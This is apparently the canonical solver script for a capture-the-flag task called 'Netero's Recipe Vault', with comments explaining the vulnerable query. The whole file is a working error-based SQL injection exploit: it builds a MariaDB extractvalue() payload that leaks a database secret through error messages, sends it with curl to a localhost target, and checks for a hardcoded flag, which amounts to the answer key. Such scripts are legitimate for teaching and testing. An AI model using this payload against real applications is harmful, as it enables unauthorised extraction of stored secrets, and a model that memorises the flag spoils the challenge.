#!/usr/bin/env bash
# solvers/p1_2.sh, Task 1.2 "Netero's Recipe Vault" canonical exploit.
#
# The recipe lookup route builds its query with raw string concatenation:
#   SELECT name FROM vault WHERE id='{id}'
# and, critically, surfaces the raw DBMS exception text back to the page
# on a query error. MariaDB's extractvalue() throws an XPATH syntax error
# whose message embeds (up to ~32 chars of) its second argument, so wrapping
# a subquery in extractvalue(1, concat(0x3a, (SELECT secret FROM vault
# LIMIT 1))) forces the flag itself into that error string, error-based
# extraction without ever seeing a normal result row.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{100_type_error_leak}"

PAYLOAD="1' AND extractvalue(1,concat(0x3a,(SELECT secret FROM vault LIMIT 1)))-- -"

echo "[p1_2] GET ${BASE}/p1/recipe, error-based extractvalue() payload"
resp=$(curl -s -G "${BASE}/p1/recipe" --data-urlencode "id=${PAYLOAD}")

if echo "$resp" | grep -qF "$FLAG"; then
    echo "  ok: response contains flag: ${FLAG}"
    echo "[p1_2] PASS"
    exit 0
else
    echo "  FAIL: response did not contain the flag"
    echo "---- response body ----"
    echo "$resp"
    echo "------------------------"
    echo "[p1_2] FAIL"
    exit 1
fi
